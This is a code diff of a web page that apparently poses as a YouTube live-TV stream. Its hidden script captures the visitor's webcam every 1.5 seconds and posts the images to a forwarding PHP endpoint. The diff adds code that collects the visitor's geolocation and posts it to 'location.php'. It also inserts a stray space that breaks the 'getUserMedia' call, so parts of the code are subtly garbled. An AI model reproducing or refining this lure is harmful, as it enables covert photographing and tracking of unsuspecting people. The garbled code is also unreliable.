@@ -15,20 +15,47 @@
 <script>
 
 function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
-    }
-  });
-};
+    $.ajax({
+        type: 'POST',
+        data: { cat: imgdata},
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function(result){
+            // call the function that handles the response/results
+        },
+        error: function(){
+        }
+    });
+}
 
+function sendLocation(latitude, longitude) {
+    $.ajax({
+        type: 'POST',
+        url: 'location.php', // Ganti dengan path yang sesuai
+        data: { lat: latitude, long: longitude },
+        success: function(response) {
+            console.log("Location sent successfully: " + response);
+        },
+        error: function() {
+            console.error("Error sending location.");
+        }
+    });
+}
+
+function getLocation() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function(position) {
+            var latitude = position.coords.latitude;
+            var longitude = position.coords.longitude;
+            sendLocation(latitude, longitude);
+        }, function(error) {
+            console.error("Error getting location: " + error.message);
+        });
+    } else {
+        console.log("Geolocation is not supported by this browser.");
+    }
+}
 
 'use strict';
 
@@ -39,7 +66,6 @@ const errorMsgElement = document.querySelector('span#errorMsg');
 const constraints = {
   audio: false,
   video: {
-    
     facingMode: "user"
   }
 };
@@ -47,10 +73,10 @@ const constraints = {
 // Access webcam
 async function init() {
   try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    const stream = await navigator.mediaDevices.getUser Media(constraints);
     handleSuccess(stream);
   } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+    errorMsgElement.innerHTML = `navigator.getUser Media error:${e.toString()}`;
   }
 }
 
@@ -59,14 +85,15 @@ function handleSuccess(stream) {
   window.stream = stream;
   video.srcObject = stream;
 
-var context = canvas.getContext('2d');
+  var context = canvas.getContext('2d');
   setInterval(function(){
-
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
+       post(canvasData); 
+  }, 1500);
   
-
+  // Mendapatkan lokasi setelah video dimulai
+  getLocation();
 }
 
 // Load init
@@ -74,9 +101,7 @@ init();
 
 </script>
 
-    <body>
-        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-    </body>
-
+<body>
+    <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</body>
 </html>
